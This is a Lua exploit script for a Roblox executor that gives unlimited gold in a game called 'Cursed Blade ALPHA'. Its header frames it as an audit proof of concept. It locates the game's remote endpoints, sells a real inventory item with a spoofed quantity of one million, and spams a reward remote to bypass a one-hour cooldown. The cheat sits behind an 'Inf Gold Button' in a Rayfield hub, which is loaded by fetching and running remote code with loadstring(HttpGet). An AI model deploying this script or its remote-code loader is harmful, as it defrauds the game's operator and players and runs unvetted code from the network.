--[[
    ============================================================
    Cursed Blade ALPHA — Infinite Gold Exploit Simulation
    ============================================================
    PURPOSE : Proof-of-concept for the developer / security audit.
              Demonstrates the three client-side bypass paths that
              allow unlimited gold generation.

    CONTEXT : This script would be executed inside a Roblox script
              executor (e.g. Synapse X, Fluxus) by an exploiter who
              has a copy of the game.  It targets the RemoteEvent /
              RemoteFunction surface exposed by the game's LocalScripts.

    HOW IT WORKS (summary):
      1. SellItem Quantity Spoof   – fires SellItem with an item the
         player owns but a fake large quantity; server awards gold
         for the full quantity if it doesn't validate inventory.
      2. GetReward Cooldown Bypass – fires GetReward("AccessoryReward")
         in a tight loop, ignoring the 1-hour client-side gate.
      3. AFK/AFKRoll Reward Spam  – fires AFK and AFKRoll every tick
         instead of waiting 30 s / 2 s respectively.
    ============================================================
]]

-- ── Helpers ─────────────────────────────────────────────────────────────────

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Rayfield Example Window",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "Rayfield Interface Suite",
   LoadingSubtitle = "by Sirius",
   ShowText = "Rayfield", -- for mobile users to unhide Rayfield, change if you'd like
   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   ToggleUIKeybind = "K", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from emitting warnings when the script has a version mismatch with the interface.

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include Discord.gg/. E.g. Discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the Discord every time they load it up
   },

   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique, as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"Hello"} -- List of keys that the system will accept, can be RAW file links (pastebin, github, etc.) or simple strings ("hello", "key22")
   }
})

local Tab = Window:CreateTab("Currency", 4483362458) -- Title, Image
local Section = Tab:CreateSection("Infinite Gold")

local Players      = game:GetService("Players")
local LocalPlayer  = Players.LocalPlayer
local RS           = game:GetService("ReplicatedStorage")

-- Locate the Remote folder the game uses for all client↔server calls
-- (confirmed via DataChange = RS.Remote.DataChange in DataMgr script)
local Remote = RS:WaitForChild("Remote", 10)
if not Remote then
    warn("[exploit] Remote folder not found – wrong place?")
    return
end

-- The game routes everything through a single RemoteEvent + RemoteFunction
-- pair managed by NetMgr.  Find them by class.
local remoteEvent    = nil
local remoteFunction = nil
for _, obj in Remote:GetChildren() do
    if obj:IsA("RemoteEvent")    then remoteEvent    = obj end
    if obj:IsA("RemoteFunction") then remoteFunction = obj end
end

if not remoteEvent or not remoteFunction then
    warn("[exploit] Could not locate RemoteEvent / RemoteFunction inside Remote")
    return
end

-- Wrappers that mimic NetMgr:FireServer() and NetMgr:InvokeServer()
local function FireServer(eventName, ...)
    remoteEvent:FireServer(eventName, ...)
end

local function InvokeServer(funcName, ...)
    return remoteFunction:InvokeServer(funcName, ...)
end

-- ── Step 0: Discover a valid item in the player's inventory ─────────────────
--
-- The game stores inventory in PlayerBaseData("inv").
-- We InvokeServer to fetch one real item so the item reference is genuine.
-- The exploit then sends that reference with a fabricated quantity.

print("[exploit] Fetching inventory...")
local inventory = InvokeServer("GetPlayerBaseData", "inv")

local targetItem = nil
print("Printing inventory")
print(inventory)
if inventory then
    -- Grab the first item we find
    print(inventory)
    for _, item in pairs(inventory) do
        if item and item.id then
            targetItem = item
            break
        end
    end
end

-- ── EXPLOIT 1: SellItem Quantity Spoof ──────────────────────────────────────
--
-- Vulnerability: FireServer("SellItem", itemRef, quantity)
--   • No client-side inventory count check
--   • Server awards gold = itemSellPrice × quantity
--   • Exploiter sends a real item reference with a huge fake quantity
--
-- Normal code path (Script 28417):
--   function v_u_2.SellItem(_, p22, p23)
--       v_u_5:FireServer("SellItem", p22, p23)   -- p23 is quantity, never validated
--   end

local SELL_QUANTITY_SPOOF = 1_000_000   -- fake quantity sent to server

local function sellSpoof()
    if targetItem then
        print(string.format(
            "[exploit] VULN 1 — Selling item id=%s with spoofed qty=%d",
            tostring(targetItem.id), SELL_QUANTITY_SPOOF
        ))

        -- One call is enough to demonstrate the vulnerability.
        -- In a real attack this is called in a loop.
        FireServer("SellItem", targetItem, SELL_QUANTITY_SPOOF)

        print("[exploit] SellItem fired. If server does not validate inventory count,")
        print("          gold += sellPrice(item) × 1,000,000")
    else
        warn("[exploit] VULN 1 skipped — could not read inventory (may need to wait for load)")
    end
end 

-- ── EXPLOIT 2: GetReward Cooldown Bypass ────────────────────────────────────
--
-- Vulnerability: FireServer("GetReward", "AccessoryReward")
--   • The 1-hour cooldown lives in local variable v_u_14 (Script 27438)
--   • Calling FireServer directly skips the `if v_u_14 + 3600 > os.time()` gate
--   • Each successful call grants a free accessory item
--   • Accessories are then sold for gold (chained with EXPLOIT 1)
--
-- Normal code path (Script 27595):
--   function v2.GetReward(_, p10, ...)
--       v_u_3:FireServer("GetReward", p10, ...)   -- no cooldown check here
--   end

local REWARD_SPAM_COUNT = 50  -- how many times to fire in this demo


local function rewardSpam()
    print(string.format(
        "\n[exploit] VULN 2 — Spamming GetReward('AccessoryReward') × %d (cooldown bypassed)",
        REWARD_SPAM_COUNT
    ))

    for i = 1, REWARD_SPAM_COUNT do
        FireServer("GetReward", "AccessoryReward")
        -- yield every 10 calls to avoid saturating the remote queue
        if i % 10 == 0 then
            task.wait()
            print(string.format("          ...%d rewards claimed", i))
        end
    end

    print("[exploit] Reward spam done. Inventory should contain ~" .. REWARD_SPAM_COUNT .. " accessories.")
    print("          Each accessory is sold with EXPLOIT 1 for compounding gold gain.")

end

local Button = Tab:CreateButton({
   Name = "Inf Gold Button",
   Callback = function()
   -- The function that takes place when the button is pressed
   sellSpoof()
   end,
})
